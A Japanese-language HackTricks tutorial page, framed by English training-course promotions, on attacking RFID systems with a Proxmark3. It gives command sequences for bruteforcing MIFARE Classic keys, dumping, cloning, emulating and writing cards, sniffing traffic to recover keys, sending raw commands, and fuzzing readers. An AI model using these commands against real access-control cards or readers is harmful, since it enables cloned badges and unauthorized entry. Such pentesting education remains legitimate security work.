# Proxmark 3

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Proxmark3を使用したRFIDシステムの攻撃

最初に必要なのは[**Proxmark3**](https://proxmark.com)を持っていて、[**ソフトウェアとその依存関係をインストールすること**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**です**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)。

### MIFARE Classic 1KBの攻撃

それは**16セクター**を持ち、それぞれに**4ブロック**があり、各ブロックには**16B**が含まれています。UIDはセクター0のブロック0にあり（変更できません）。\
各セクターにアクセスするには、**2つのキー**（**A**と**B**）が必要で、これらは**各セクターのブロック3**（セクタートレーラー）に保存されています。セクタートレーラーは、**2つのキー**を使用して**各ブロック**の**読み取りおよび書き込み**権限を与える**アクセスビット**も保存しています。\
2つのキーは、最初のキーを知っていれば読み取り権限を与え、2番目のキーを知っていれば書き込み権限を与えるのに役立ちます（例えば）。

いくつかの攻撃が実行できます。
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3は、**タグとリーダー間の通信を傍受**して機密データを探すなど、他のアクションを実行することができます。このカードでは、通信をスニッフィングし、使用されているキーを計算することができます。なぜなら、**使用される暗号操作が弱いため**、平文と暗号文を知っていれば計算できるからです（`mfkey64`ツール）。

### Raw Commands

IoTシステムは時々**ブランドなしまたは商業用でないタグ**を使用します。この場合、Proxmark3を使用してタグにカスタム**生のコマンドを送信**することができます。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
この情報を使って、カードに関する情報や通信方法を検索することができます。Proxmark3は、次のような生のコマンドを送信することを可能にします: `hf 14a raw -p -b 7 26`

### スクリプト

Proxmark3ソフトウェアには、簡単なタスクを実行するために使用できる**自動化スクリプト**のプリロードされたリストが付属しています。完全なリストを取得するには、`script list`コマンドを使用します。次に、`script run`コマンドを使用し、スクリプトの名前を続けて入力します:
```
proxmark3> script run mfkeys
```
あなたは**タグリーダーをファズ**するスクリプトを作成できます。**有効なカード**のデータをコピーするために、1つ以上のランダムな**バイト**を**ランダム化**し、**リーダーがクラッシュ**するかどうかを各イテレーションで確認する**Luaスクリプト**を書くだけです。

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
